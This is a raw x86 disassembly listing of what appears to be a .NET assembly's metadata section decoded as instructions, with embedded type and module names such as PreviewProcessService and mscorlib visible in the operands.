  40502f:	or     esi,DWORD PTR [eax]
  405031:	or     ecx,DWORD PTR [ecx]
  405033:	add    esi,DWORD PTR [eax]
  405035:	or     edx,DWORD PTR [ebx+edx*1+0x21fa0309]
  40503c:	jno    0x405047
  40503e:	mov    eax,ds:0xa4223703
  405043:	adc    esp,DWORD PTR [ecx-0x56ead0fd]
  405049:	adc    esp,DWORD PTR [ecx-0x52ddb6fd]
  40504f:	adc    edx,ecx
  405051:	add    BYTE PTR [esi+0x22],cl
  405054:	jno    0x40505f
  405056:	fld    DWORD PTR [ebx]
  405058:	out    dx,eax
  405059:	add    eax,0x3e90971
  40505e:	out    dx,eax
  40505f:	add    eax,0x3f10d78
  405064:	out    dx,eax
  405065:	add    eax,0xd10af1
  40506a:	out    dx,eax
  40506b:	add    eax,0xd113d3
  405070:	sub    cl,BYTE PTR [esi]
  405072:	icebp  
  405073:	or     dl,cl
  405075:	add    bl,bh
  405077:	and    dl,BYTE PTR [edi+0xc00d109]
  40507d:	and    esi,DWORD PTR [ecx+0x9]
  405080:	rol    DWORD PTR [eax],1
  405082:	adc    ah,BYTE PTR [ebx]
  405084:	jno    0x40508f
  405086:	push   cs
  405087:	add    BYTE PTR [eax+eax*1],al
  40508a:	push   ss
  40508b:	add    BYTE PTR [eax],cl
  40508d:	add    BYTE PTR [eax],cl
  40508f:	add    BYTE PTR [edx],ch
  405091:	add    BYTE PTR [eax],cl
  405093:	add    BYTE PTR [eax+eax*1],cl
  405096:	das    
  405097:	add    BYTE PTR [eax],cl
  405099:	add    BYTE PTR [eax],dl
  40509b:	add    BYTE PTR [eax+eax*1],dh
  40509e:	or     BYTE PTR [eax],al
  4050a0:	adc    al,0x0
  4050a2:	das    
  4050a3:	add    BYTE PTR [esi],cl
  4050a5:	add    BYTE PTR [eax],bl
  4050a7:	add    BYTE PTR [ecx],bh
  4050a9:	add    BYTE PTR [esi],cl
  4050ab:	add    BYTE PTR [eax+eax*1],bl
  4050ae:	inc    edx
  4050af:	add    BYTE PTR [esi],cl
  4050b1:	add    BYTE PTR [eax],ah
  4050b3:	add    BYTE PTR [ebx+0x0],ch
  4050b6:	push   cs
  4050b7:	add    BYTE PTR [eax+eax*1],ah
  4050ba:	add    eax,0x28000e01
  4050bf:	add    BYTE PTR [ecx+eax*1],ah
  4050c2:	push   cs
  4050c3:	add    BYTE PTR [eax+eax*1],ch
  4050c6:	add    eax,0x30000e01
  4050cb:	add    BYTE PTR [edi+0x1],dl
  4050ce:	push   cs
  4050cf:	add    BYTE PTR [eax+eax*1],dh
  4050d2:	push   edi
  4050d3:	add    DWORD PTR [esi],ecx
  4050d5:	add    BYTE PTR [eax],bh
  4050d7:	add    BYTE PTR [esi+0x1],bl
  4050da:	push   cs
  4050db:	add    BYTE PTR [eax+eax*1],bh
  4050de:	imul   eax,DWORD PTR [ecx],0x40000e
  4050e4:	pushf  
  4050e5:	add    DWORD PTR [esi],ecx
  4050e7:	add    BYTE PTR [eax+eax*1-0x64],al
  4050eb:	add    DWORD PTR [esi],ecx
  4050ed:	add    BYTE PTR [eax+0x0],cl
  4050f0:	mov    bh,0x1
  4050f2:	push   cs
  4050f3:	add    BYTE PTR [eax+eax*1+0x0],cl
  4050f7:	add    cl,BYTE PTR [esi]
  4050f9:	add    BYTE PTR [eax+0x0],dl
  4050fc:	dec    ebp
  4050fd:	add    cl,BYTE PTR [esi]
  4050ff:	add    BYTE PTR [eax+eax*1+0x5c],dl
  405103:	add    cl,BYTE PTR [esi]
  405105:	add    BYTE PTR [eax+0x0],bl
  405108:	imul   eax,DWORD PTR [edx],0xe
  40510b:	add    BYTE PTR [eax+eax*1+0x78],bl
  40510f:	add    cl,BYTE PTR [esi]
  405111:	add    BYTE PTR [eax+0x0],ah
  405114:	push   ss
  405115:	add    BYTE PTR [ecx],cl
  405117:	add    BYTE PTR [eax+eax*1-0x78],ah
  40511b:	add    cl,BYTE PTR [ecx]
  40511d:	add    BYTE PTR [eax+0x0],ch
  405120:	das    
  405121:	add    BYTE PTR [esi],cl
  405123:	add    BYTE PTR [eax+eax*1-0x73],ch
  405127:	add    cl,BYTE PTR [esi]
  405129:	add    BYTE PTR [eax+0x0],dh
  40512c:	mov    al,ds:0x74000e02
  405131:	add    BYTE PTR [edi+0x78000e02],bh
  405137:	add    BYTE PTR [ebp+0x3],bl
  40513a:	push   cs
  40513b:	add    BYTE PTR [eax+eax*1-0x78],bh
  40513f:	add    ecx,DWORD PTR [esi]
  405141:	add    BYTE PTR [eax+0xe039900],al
  405147:	add    BYTE PTR [eax+eax*1+0xe061b],al
  40514e:	mov    BYTE PTR [eax],al
  405150:	cmp    al,0x6
  405152:	push   cs
  405153:	add    BYTE PTR [eax+eax*1+0xe08be],cl
  40515a:	nop
  40515b:	add    BYTE PTR [esi+eax*1],bh
  40515e:	push   cs
  40515f:	add    BYTE PTR [eax+eax*1+0xe08be],dl
  405166:	cwde   
  405167:	add    BYTE PTR [esi],dl
  405169:	add    BYTE PTR [esi],cl
  40516b:	add    BYTE PTR [eax+eax*1+0x808df],bl
  405172:	lods   al,BYTE PTR ds:[esi]
  405173:	add    BYTE PTR [ebp-0x4ffff7f7],dh
  405179:	add    BYTE PTR [edx-0x4bfff7f7],bh
  40517f:	add    BYTE PTR [edi-0x47fff7f7],bh
  405185:	add    ah,al
  405187:	or     DWORD PTR [esi],ecx
  405189:	add    BYTE PTR [eax+eax*1+0xe09de],bh
  405190:	rol    BYTE PTR [eax],0xf
  405193:	or     cl,BYTE PTR [esi]
  405195:	add    ah,al
  405197:	add    BYTE PTR [edx+ecx*1+0xe],al
  40519b:	add    al,cl
  40519d:	add    BYTE PTR [ecx+0xa],ch
  4051a0:	push   cs
  4051a1:	add    al,ch
  4051a3:	add    BYTE PTR [esi+0x5100020b],bh
  4051a9:	add    ah,BYTE PTR [esi]
  4051ab:	or     al,0x2e
  4051ad:	add    BYTE PTR [ebx+0x2e154d00],al
  4051b3:	add    BYTE PTR [ebx],dh
  4051b5:	add    BYTE PTR [esi],al
  4051b7:	adc    al,0x2e
  4051b9:	add    BYTE PTR [ebx],bh
  4051bb:	add    BYTE PTR [eax],dh
  4051bd:	adc    al,0x2e
  4051bf:	add    BYTE PTR [ebx+0x0],bh
  4051c2:	inc    esp
  4051c3:	adc    eax,0x8b002e
  4051c8:	push   esi
  4051c9:	adc    eax,0x1b002e
  4051ce:	out    0x13,al
  4051d0:	add    BYTE PTR cs:[ebx],ch
  4051d3:	add    ah,ch
  4051d5:	adc    ebp,DWORD PTR [esi]
  4051d7:	add    BYTE PTR [ebx+0x0],dl
  4051da:	mov    dl,BYTE PTR [esi+ebp*1]
  4051dd:	add    BYTE PTR [ebx+0x0],al
  4051e0:	dec    ebx
  4051e1:	adc    al,0x2e
  4051e3:	add    BYTE PTR [ebx+0x0],cl
  4051e6:	js     0x4051fc
  4051e8:	add    BYTE PTR cs:[ebx+0x0],ah
  4051ec:	(bad)  
  4051ed:	adc    al,0x2e
  4051ef:	add    BYTE PTR [ebx+0x0],dh
  4051f2:	not    BYTE PTR [esi+ebp*1]
  4051f5:	add    BYTE PTR [ebx+0x0],bl
  4051f8:	rcl    BYTE PTR [esi+ebp*1],0x0
  4051fc:	imul   eax,DWORD PTR [eax],0xffffffc6
  4051ff:	adc    al,0xa3
  405201:	add    BYTE PTR [ebx],dl
  405203:	add    DWORD PTR [ebp-0x24fe9cf7],esi
  405209:	add    ah,BYTE PTR [eax-0x24fe7cf2]
  40520f:	add    dl,cl
  405211:	push   cs
  405212:	jecxz  0x405215
  405214:	or     eax,DWORD PTR [ebx]
  405216:	mov    ch,0x9
  405218:	add    eax,DWORD PTR [edx]
  40521a:	or     eax,DWORD PTR [ebx]
  40521c:	mov    ch,0x9
  40521e:	and    eax,DWORD PTR [edx]
  405220:	sbb    eax,DWORD PTR [ebx]
  405222:	cmp    al,0x10
  405224:	inc    ebx
  405225:	add    bl,BYTE PTR [ebx]
  405227:	add    eax,DWORD PTR [ebx]
  405229:	adc    DWORD PTR [edx+eax*1+0xb],eax
  40522d:	add    BYTE PTR [ebp+0xb02a309],dh
  405233:	add    esi,DWORD PTR [ebp+0xb02c309]
  405239:	add    esi,DWORD PTR [ebp+0xb02e309]
  40523f:	add    esi,DWORD PTR [ebp+0xb030309]
  405245:	add    esi,DWORD PTR [ebp+0xb032309]
  40524b:	add    esi,DWORD PTR [ebp+0xb034309]
  405251:	add    esi,DWORD PTR [ebp+0xb036309]
  405257:	add    esi,DWORD PTR [ebp+0xb038309]
  40525d:	add    esi,DWORD PTR [ebp+0xb03a309]
  405263:	add    esi,DWORD PTR [ebp+0xb03c309]
  405269:	add    esi,DWORD PTR [ebp+0xb03e309]
  40526f:	add    esi,DWORD PTR [ebp-0x1cf9fff7]
  405275:	add    dh,BYTE PTR [ebp-0x1cf9dff7]
  40527b:	add    dh,BYTE PTR [ebp-0x1cf9bff7]
  405281:	add    dh,BYTE PTR [ebp-0x1cf99ff7]
  405287:	add    dh,BYTE PTR [ebp-0x1cf97ff7]
  40528d:	add    dh,BYTE PTR [ebp-0x1cf95ff7]
  405293:	add    dh,BYTE PTR [ebp-0x1cf93ff7]
  405299:	add    dh,BYTE PTR [ebp-0x1cf91ff7]
  40529f:	add    dh,BYTE PTR [ebp-0x1cf8fff7]
  4052a5:	add    dh,BYTE PTR [ebp-0x1cf8dff7]
  4052ab:	add    dh,BYTE PTR [ebp-0x1cf8bff7]
  4052b1:	add    dh,BYTE PTR [ebp-0x1cf89ff7]
  4052b7:	add    dh,BYTE PTR [ebp-0x1cf87ff7]
  4052bd:	add    dh,BYTE PTR [ebp-0x1cf85ff7]
  4052c3:	add    dh,BYTE PTR [ebp-0x1cf83ff7]
  4052c9:	add    dh,BYTE PTR [ebp-0x1cf81ff7]
  4052cf:	add    dh,BYTE PTR [ebp-0x1cf7fff7]
  4052d5:	add    dh,BYTE PTR [ebp-0x1cf7dff7]
  4052db:	add    dh,BYTE PTR [ebp-0x1cf7bff7]
  4052e1:	add    dh,BYTE PTR [ebp+0xb084109]
  4052e7:	add    esi,DWORD PTR [ebp-0x1cf79ff7]
  4052ed:	add    dh,BYTE PTR [ebp+0xb086109]
  4052f3:	add    esi,DWORD PTR [ebp-0x1cf77ff7]
  4052f9:	add    bl,bl
  4052fb:	jno    0xb5435e09
  405301:	or     DWORD PTR [eax-0x4afd1cf8],esp
  405307:	or     DWORD PTR [ecx-0x4afcf4f8],esp
  40530d:	or     eax,eax
  40530f:	or     bl,ah
  405311:	add    dh,BYTE PTR [ebp+0xb08c109]
  405317:	add    esi,DWORD PTR [ebp-0x1cf71ff7]
  40531d:	add    dh,BYTE PTR [ebp+0xb08e109]
  405323:	add    esi,DWORD PTR [ebp-0x1cf6fff7]
  405329:	add    dh,BYTE PTR [ebp-0x1cf6dff7]
  40532f:	add    dh,BYTE PTR [ebp-0x1cf6bff7]
  405335:	add    dh,BYTE PTR [ebp-0x1cf69ff7]
  40533b:	add    dh,BYTE PTR [ebp-0x1cf67ff7]
  405341:	add    dh,BYTE PTR [ebp+0xb0fc009]
  405347:	add    esi,DWORD PTR [ebp+0xb102009]
  40534d:	add    esi,DWORD PTR [ebp+0xb104009]
  405353:	add    esi,DWORD PTR [ebp+0xb106009]
  405359:	add    esi,DWORD PTR [ebp+0xb108009]
  40535f:	add    esi,DWORD PTR [ebp+0xb10a009]
  405365:	add    esi,DWORD PTR [ebp+0xb10c009]
  40536b:	add    esi,DWORD PTR [ebp+0xb10e009]
  405371:	add    esi,DWORD PTR [ebp+0xb110009]
  405377:	add    esi,DWORD PTR [ebp+0xb112009]
  40537d:	add    esi,DWORD PTR [ebp+0xb114009]
  405383:	add    esi,DWORD PTR [ebp-0x15f31ef7]
  405389:	or     al,0x16
  40538b:	or     eax,0xd360d20
  405390:	pop    edi
  405391:	or     eax,0xde60dc9
  405396:	add    cl,BYTE PTR [esi]
  405398:	fs push cs
  40539a:	fwait
  40539b:	push   cs
  40539c:	add    BYTE PTR [eax],dl
  40539e:	add    eax,0x15101010
  4053a3:	adc    BYTE PTR [esi],bl
  4053a5:	adc    BYTE PTR [ebx],ah
  4053a7:	adc    BYTE PTR [eax],ch
  4053a9:	adc    BYTE PTR [esi],dh
  4053ab:	adc    dl,bh
  4053ad:	adc    BYTE PTR [ebx-0x1aed38ee],ah
  4053b3:	adc    bh,dh
  4053b5:	adc    dl,BYTE PTR [esi]
  4053b7:	adc    esp,DWORD PTR [ebx+edx*1]
  4053ba:	aaa    
  4053bb:	adc    eax,DWORD PTR [edx+0x13]
  4053be:	pop    edx
  4053bf:	adc    ebp,DWORD PTR [edi+0x13]
  4053c2:	mov    ss,WORD PTR [ebx]
  4053c4:	popf   
  4053c5:	adc    esi,DWORD PTR [ebp-0x3cec41ed]
  4053cb:	adc    ecx,ebp
  4053cd:	adc    ebx,edx
  4053cf:	adc    edx,DWORD PTR [ecx]
  4053d1:	add    BYTE PTR [ecx],al
  4053d3:	add    BYTE PTR [eax],al
  4053d5:	add    BYTE PTR [eax],dh
  4053d7:	or     eax,0x20059
  4053dc:	add    DWORD PTR [eax],eax
  4053de:	add    al,0x0
  4053e0:	add    al,BYTE PTR [eax]
  4053e2:	push   es
  4053e3:	add    BYTE PTR [eax+eax*1],al
  4053e6:	pop    es
  4053e7:	add    BYTE PTR [esi],al
  4053e9:	add    BYTE PTR [eax],cl
  4053eb:	add    BYTE PTR [edi],al
  4053ed:	add    BYTE PTR [edi],cl
  4053ef:	add    BYTE PTR [ecx],cl
  4053f1:	add    BYTE PTR [eax],dl
  4053f3:	add    BYTE PTR [ebx],cl
  4053f5:	add    BYTE PTR [ebx],dl
  4053f7:	add    BYTE PTR [eax+eax*1],cl
  4053fa:	add    BYTE PTR [eax],al
  4053fc:	push   ebp
  4053fd:	add    eax,0x395
  405402:	mov    dl,0x6
  405404:	test   eax,0xb8000009
  405409:	push   es
  40540a:	lods   eax,DWORD PTR ds:[esi]
  40540b:	or     DWORD PTR [eax],eax
  40540d:	add    BYTE PTR [esi+0x9d907],al
  405413:	add    BYTE PTR [esi+0x39507],cl
  405419:	add    BYTE PTR [esi+0x9d907],al
  40541f:	add    BYTE PTR [edx+0x9a906],dh
  405425:	add    bh,ch
  405427:	or     cl,al
  405429:	or     al,BYTE PTR [eax]
  40542b:	add    BYTE PTR [esi+0x9d907],al
  405431:	add    BYTE PTR [edx],bl
  405433:	or     eax,0x395
  405438:	xchg   BYTE PTR [edi],al
  40543a:	(bad)  [ecx]
  40543c:	add    BYTE PTR [eax],al
  40543e:	and    cl,BYTE PTR [edi]
  405440:	test   eax,0x27000009
  405445:	pop    gs
  405447:	or     DWORD PTR [eax],eax
  405449:	add    BYTE PTR [ecx],al
  40544b:	push   cs
  40544c:	adc    DWORD PTR [eax+eax*1],ecx
  40544f:	add    BYTE PTR ds:0x9a90f,dh
  405455:	add    BYTE PTR [esi],bh
  405457:	movhps xmm1,QWORD PTR [eax+ecx*1]
  40545b:	add    BYTE PTR [ecx+0x0],ah
  40545e:	add    al,BYTE PTR [eax]
  405460:	adc    BYTE PTR [eax],al
  405462:	bound  eax,QWORD PTR [eax]
  405464:	add    al,BYTE PTR [eax]
  405466:	add    al,BYTE PTR [eax]
  405468:	add    DWORD PTR [eax],eax
  40546a:	add    eax,DWORD PTR [eax]
  40546c:	add    al,BYTE PTR [eax]
  40546e:	or     DWORD PTR [eax],eax
  405470:	add    eax,0xa000200
  405475:	add    BYTE PTR [edi],al
  405477:	add    BYTE PTR [ecx],al
  405479:	add    BYTE PTR [ebx],cl
  40547b:	add    BYTE PTR [edi],al
  40547d:	add    BYTE PTR [edx],al
  40547f:	add    BYTE PTR ds:0x1000900,cl
  405485:	add    BYTE PTR [esi],cl
  405487:	add    BYTE PTR [ecx],cl
  405489:	add    BYTE PTR [edx],al
  40548b:	add    BYTE PTR [edx],dl
  40548d:	add    BYTE PTR [ebx],cl
  40548f:	add    BYTE PTR [edx],al
  405491:	add    BYTE PTR [eax+eax*1],dl
  405494:	or     eax,0x15000100
  405499:	add    BYTE PTR ds:0x24000200,cl
  40549f:	add    BYTE PTR [edi],cl
  4054a1:	add    BYTE PTR [edx],al
  4054a3:	add    BYTE PTR ds:0x1001100,ah
  4054a9:	add    BYTE PTR [edx+0x0],bl
  4054ac:	adc    eax,DWORD PTR [eax]
  4054ae:	add    al,BYTE PTR [eax]
  4054b0:	pop    ecx
  4054b1:	add    BYTE PTR [ebx],dl
  4054b3:	add    BYTE PTR [edx],al
  4054b5:	add    BYTE PTR [ebx+0x0],bl
  4054b8:	adc    eax,0x5d000200
  4054bd:	add    BYTE PTR [edi],dl
  4054bf:	add    BYTE PTR [ecx],al
  4054c1:	add    BYTE PTR [esi+0x0],bl
  4054c4:	pop    ss
  4054c5:	add    BYTE PTR [edx],al
  4054c7:	add    BYTE PTR [ecx+0x1001900],al
  4054cd:	add    BYTE PTR [edx+0x1001900],al
  4054d3:	add    BYTE PTR [eax+eax*1+0x2001b],al
  4054da:	add    DWORD PTR [eax],0x1b
  4054dd:	add    BYTE PTR [edx],al
  4054df:	add    BYTE PTR [ebp+0x1001d00],al
  4054e5:	add    BYTE PTR [esi+0x2001d00],al
  4054eb:	add    BYTE PTR [edi+0x1001f00],al
  4054f1:	add    BYTE PTR [eax+0x2001f00],cl
  4054f7:	add    BYTE PTR [ecx+0x1002100],cl
  4054fd:	add    BYTE PTR [edx-0x43ffdf00],cl
  405503:	or     eax,0xe210e0e
  405508:	cmp    cl,BYTE PTR [esi]
  40550a:	inc    ebx
  40550b:	push   cs
  40550c:	pop    esp
  40550d:	push   cs
  40550e:	stc    
  40550f:	psrlq  mm2,QWORD PTR [edx]
  405512:	fcom   QWORD PTR [edx]
  405514:	sub    dl,BYTE PTR [ebx]
  405516:	add    al,0x80
  405518:	add    BYTE PTR [eax],al
  40551a:	or     eax,DWORD PTR [eax]
  40551c:	add    BYTE PTR [eax],al
  40551e:	add    BYTE PTR [eax],al
  405520:	add    BYTE PTR [eax],al
  405522:	add    DWORD PTR [eax],eax
  405524:	add    BYTE PTR [eax],al
  405526:	xor    al,0xc
  405528:	jne    0x40552b
  40552a:	add    BYTE PTR [eax],al
  40552c:	add    al,0x0
	...
  405536:	add    BYTE PTR [eax],al
  405538:	add    DWORD PTR [eax],eax
  40553a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40553b:	add    DWORD PTR [eax],eax
  40553d:	add    BYTE PTR [eax],al
  40553f:	add    BYTE PTR [eax+eax*1],al
	...
  40554a:	add    BYTE PTR [eax],al
  40554c:	add    DWORD PTR [eax],eax
  40554e:	rol    DWORD PTR [ecx],0x0
  405551:	add    BYTE PTR [eax],al
  405553:	add    BYTE PTR [ebx],cl
	...
  40555d:	add    BYTE PTR [eax],al
  40555f:	add    BYTE PTR [edx],cl
  405561:	add    BYTE PTR [edi],bh
  405563:	add    al,BYTE PTR [eax]
  405565:	add    BYTE PTR [eax],al
  405567:	add    BYTE PTR [ebx],cl
	...
  405571:	add    BYTE PTR [eax],al
  405573:	add    BYTE PTR [edx],cl
  405575:	add    BYTE PTR [ebp+0xc],cl
  405578:	add    BYTE PTR [eax],al
  40557a:	add    BYTE PTR [eax],al
  40557c:	or     eax,DWORD PTR [eax]
	...
  405586:	add    BYTE PTR [eax],al
  405588:	or     al,BYTE PTR [eax]
  40558a:	pop    ss
  40558b:	push   ss
  40558c:	add    BYTE PTR [eax],al
  40558e:	add    BYTE PTR [eax],al
  405590:	add    al,0x0
	...
  40559a:	add    BYTE PTR [eax],al
  40559c:	add    DWORD PTR [eax],eax
  40559e:	scas   al,BYTE PTR es:[edi]
  40559f:	add    DWORD PTR [eax],eax
  4055a1:	add    BYTE PTR [eax],al
  4055a3:	add    BYTE PTR [ebx],cl
	...
  4055ad:	add    BYTE PTR [eax],al
  4055af:	add    BYTE PTR [edx],cl
  4055b1:	add    BYTE PTR [esi],dl
  4055b3:	sbb    eax,DWORD PTR [eax]
  4055b5:	add    BYTE PTR [eax],al
  4055b7:	add    BYTE PTR [ebx],cl
	...
  4055c1:	add    BYTE PTR [eax],al
  4055c3:	add    BYTE PTR [edx],cl
  4055c5:	add    BYTE PTR [eax],ah
  4055c7:	and    DWORD PTR [eax],eax
  4055c9:	add    BYTE PTR [eax],al
  4055cb:	add    BYTE PTR [eax],al
  4055cd:	add    BYTE PTR [eax],al
  4055cf:	add    BYTE PTR [ecx],al
  4055d1:	add    BYTE PTR [eax],al
  4055d3:	add    BYTE PTR [edi],dl
  4055d5:	and    eax,DWORD PTR [eax]
  4055d7:	add    BYTE PTR [eax],bl
  4055d9:	add    al,BYTE PTR [eax]
  4055db:	add    BYTE PTR [ecx],al
  4055dd:	add    BYTE PTR [eax],al
  4055df:	add    BYTE PTR [eax+0x23],dl
  4055e2:	add    BYTE PTR [eax],al
  4055e4:	add    eax,0x7000400
  4055e9:	add    BYTE PTR [esi],al
  4055eb:	add    BYTE PTR [edx],cl
  4055ed:	add    BYTE PTR [ecx],cl
  4055ef:	add    BYTE PTR [eax],dl
  4055f1:	add    BYTE PTR [edi],cl
  4055f3:	add    BYTE PTR [ebx],dl
  4055f5:	add    BYTE PTR [edx],dl
  4055f7:	add    BYTE PTR [eax+eax*1],dl
  4055fa:	adc    al,BYTE PTR [eax]
  4055fc:	adc    eax,0x16000e00
  405601:	add    BYTE PTR [esi],cl
  405603:	add    BYTE PTR [edi],dl
  405605:	add    BYTE PTR [esi],cl
  405607:	add    BYTE PTR [eax],bl
  405609:	add    BYTE PTR [esi],cl
  40560b:	add    BYTE PTR [ecx],bl
  40560d:	add    BYTE PTR [esi],cl
  40560f:	add    BYTE PTR [edx],bl
  405611:	add    BYTE PTR [esi],cl
  405613:	add    BYTE PTR [ebx],bl
  405615:	add    BYTE PTR [esi],cl
  405617:	add    BYTE PTR [eax+eax*1],bl
  40561a:	adc    al,BYTE PTR [eax]
  40561c:	sbb    eax,0x1e001200
  405621:	add    BYTE PTR [edx],dl
  405623:	add    BYTE PTR [edi],bl
  405625:	add    BYTE PTR [eax+eax*1],dl
  405628:	retf   
  405629:	add    ch,dh
  40562b:	adc    cl,bl
  40562d:	add    BYTE PTR [esi+0x12],bh
  405630:	add    BYTE PTR [eax],al
  405632:	add    BYTE PTR [eax],al
  405634:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  40563b:	gs add BYTE PTR ds:[eax+0x72],dl
  405640:	gs jbe 0x4056ac
  405643:	gs ja  0x405696
  405646:	jb     0x4056b7
  405648:	arpl   WORD PTR [ebp+0x73],sp
  40564b:	jae    0x4056b6
  40564d:	outs   dx,BYTE PTR ds:[esi]
  40564e:	addr16 push ebx
  405650:	gs jb  0x4056c9
  405653:	imul   esp,DWORD PTR [ebx+0x65],0x6578652e
  40565a:	add    BYTE PTR [ecx+0x73],al
  40565d:	jae    0x4056c4
  40565f:	ins    DWORD PTR es:[edi],dx
  405660:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  405664:	gs jb  0x4056da
  405667:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  40566e:	add    BYTE PTR [eax+0x75],dl
  405671:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  405675:	dec    ebx
  405676:	gs jns 0x4056bc
  405679:	outs   dx,DWORD PTR ds:[esi]
  40567a:	outs   dx,BYTE PTR ds:[esi]
  40567b:	jae    0x4056f1
  40567d:	popa   
  40567e:	outs   dx,BYTE PTR ds:[esi]
  40567f:	je     0x4056f4
  405681:	add    BYTE PTR [ebp+0x69],cl
  405684:	arpl   WORD PTR [edx+0x6f],si
  405687:	jae    0x4056f8
  405689:	data16 je 0x4056ba
  40568c:	push   edx
  40568d:	gs jo  0x4056ff
  405690:	jb     0x405706
  405692:	imul   ebp,DWORD PTR [esi+0x67],0x76726553
  405699:	imul   esp,DWORD PTR [ebx+0x65],0x61420073
  4056a0:	jae    0x405707
  4056a2:	inc    ebx
  4056a3:	ins    DWORD PTR es:[edi],dx
  4056a4:	fs dec esp
  4056a6:	imul   ebp,DWORD PTR [esi+0x65],0x74704f00
  4056ad:	imul   ebp,DWORD PTR [edi+0x6e],0x70707553
  4056b4:	outs   dx,DWORD PTR ds:[esi]
  4056b5:	jb     0x40572b
  4056b7:	push   esp
  4056b8:	jns    0x40572a
  4056ba:	add    BYTE PTR gs:[edx+0x61],al
  4056be:	jae    0x405725
  4056c0:	inc    ebx
  4056c1:	ins    DWORD PTR es:[edi],dx
  4056c2:	fs dec esp
  4056c4:	imul   ebp,DWORD PTR [esi+0x65],0x69727453
  4056cb:	outs   dx,BYTE PTR ds:[esi]
  4056cc:	addr16 jae 0x4056cf
  4056cf:	dec    ebx
  4056d0:	gs jns 0x405746
  4056d3:	add    BYTE PTR [eax+0x6f],cl
  4056d6:	jae    0x40574c
  4056d8:	inc    ecx
  4056d9:	jo     0x40574b
  4056db:	ins    BYTE PTR es:[edi],dx
  4056dc:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4056e3:	add    BYTE PTR [ebp+0x69],cl
  4056e6:	arpl   WORD PTR [edx+0x6f],si
  4056e9:	jae    0x40575a
  4056eb:	data16 je 0x40571c
  4056ee:	push   edx
  4056ef:	gs jo  0x405761
  4056f2:	jb     0x405768
  4056f4:	imul   ebp,DWORD PTR [esi+0x67],0x6572502e
  4056fb:	jbe    0x405766
  4056fd:	gs ja  0x405748
  405700:	outs   dx,DWORD PTR ds:[esi]
  405701:	jae    0x405777
  405703:	add    BYTE PTR [ebx+0x61],dl
  405706:	ins    DWORD PTR es:[edi],dx
  405707:	gs push ebp
  405709:	jae    0x405770
  40570b:	jb     0x405760
  40570d:	arpl   WORD PTR gs:[ebp+0x72],si
  405711:	imul   esi,DWORD PTR [ecx+edi*2+0x42],0x76616865
  405719:	imul   ebp,DWORD PTR [edi+0x72],0x6d615300
  405720:	gs push ebp
  405722:	jae    0x405789
  405724:	jb     0x40576f
  405726:	outs   dx,BYTE PTR ds:[esi]
  405727:	jae    0x405799
  405729:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40572e:	add    BYTE PTR [ecx+0x41],cl
  405731:	jo     0x4057a3
  405733:	dec    ebp
  405734:	popa   
  405735:	outs   dx,BYTE PTR ds:[esi]
  405736:	popa   
  405737:	gs ins DWORD PTR es:[di],dx
  40573a:	outs   dx,BYTE PTR gs:[esi]
  40573c:	je     0x40573e
  40573e:	dec    ecx
  40573f:	push   eax
  405740:	jb     0x4057a7
  405742:	jbe    0x4057ad
  405744:	gs ja  0x405797
  405747:	jb     0x4057b8
  405749:	arpl   WORD PTR [ebp+0x73],sp
  40574c:	jae    0x4057b7
  40574e:	outs   dx,BYTE PTR ds:[esi]
  40574f:	add    BYTE PTR [bx+di+0x50],cl
  405753:	jb     0x4057ba
  405755:	jbe    0x4057c0
  405757:	gs ja  0x4057aa
  40575a:	jb     0x4057cb
  40575c:	arpl   WORD PTR [ebp+0x73],sp
  40575f:	jae    0x4057ca
  405761:	outs   dx,BYTE PTR ds:[esi]
  405762:	addr16 inc ebx
  405764:	popa   
  405765:	ins    BYTE PTR es:[edi],dx
  405766:	ins    BYTE PTR es:[edi],dx
  405767:	bound  esp,QWORD PTR [ecx+0x63]
  40576a:	imul   eax,DWORD PTR [eax],0x4c
  40576d:	outs   dx,DWORD PTR ds:[esi]
  40576e:	arpl   WORD PTR [ecx+0x6c],sp
  405771:	inc    ebx
  405772:	popa   
  405773:	je     0x4057d6
  405775:	ins    BYTE PTR es:[edi],dx
  405776:	outs   dx,DWORD PTR ds:[esi]
  405777:	addr16 inc ebx
  405779:	popa   
  40577a:	ins    BYTE PTR es:[edi],dx
  40577b:	ins    BYTE PTR es:[edi],dx
  40577c:	bound  esp,QWORD PTR [ecx+0x63]
  40577f:	imul   eax,DWORD PTR [eax],0x50
  405782:	jb     0x4057e9
  405784:	jbe    0x4057ef
  405786:	gs ja  0x4057d1
  405789:	outs   dx,DWORD PTR ds:[esi]
  40578a:	jae    0x405800
  40578c:	push   ebx
  40578d:	je     0x405801
  40578f:	imul   ebp,DWORD PTR [esi+0x67],0x70410073
  405796:	jo     0x4057e5
  405798:	popa   
  405799:	outs   dx,BYTE PTR ds:[esi]
  40579a:	popa   
  40579b:	gs ins DWORD PTR es:[di],dx
  40579e:	outs   dx,BYTE PTR gs:[esi]
  4057a0:	je     0x4057f5
  4057a2:	gs jb  0x40581b
  4057a5:	imul   esp,DWORD PTR [ebx+0x65],0x65725000
  4057ac:	jbe    0x405817
  4057ae:	gs ja  0x405801
  4057b1:	jb     0x405822
  4057b3:	arpl   WORD PTR [ebp+0x73],sp
  4057b6:	jae    0x405821
  4057b8:	outs   dx,BYTE PTR ds:[esi]
  4057b9:	addr16 push ebx
  4057bb:	gs jb  0x405834
  4057be:	imul   esp,DWORD PTR [ebx+0x65],0x72745300
  4057c5:	gs popa 
  4057c7:	ins    DWORD PTR es:[edi],dx
  4057c8:	dec    ecx
  4057c9:	outs   dx,BYTE PTR ds:[esi]
  4057ca:	outs   dx,WORD PTR ds:[esi]
  4057cc:	add    BYTE PTR [ebx+0x61],al
  4057cf:	outs   dx,BYTE PTR ds:[esi]
  4057d0:	arpl   WORD PTR [ebp+0x6c],sp
  4057d3:	push   ebx
  4057d4:	je     0x405837
  4057d6:	je     0x40583d
  4057d8:	add    BYTE PTR [ebp+0x73],ch
  4057db:	arpl   WORD PTR [edi+0x72],bp
  4057de:	ins    BYTE PTR es:[edi],dx
  4057df:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4057e6:	gs ins DWORD PTR es:[edi],dx
  4057e8:	add    BYTE PTR [edi+0x62],cl
  4057eb:	push   0x65
  4057ed:	arpl   WORD PTR [eax+eax*1+0x45],si
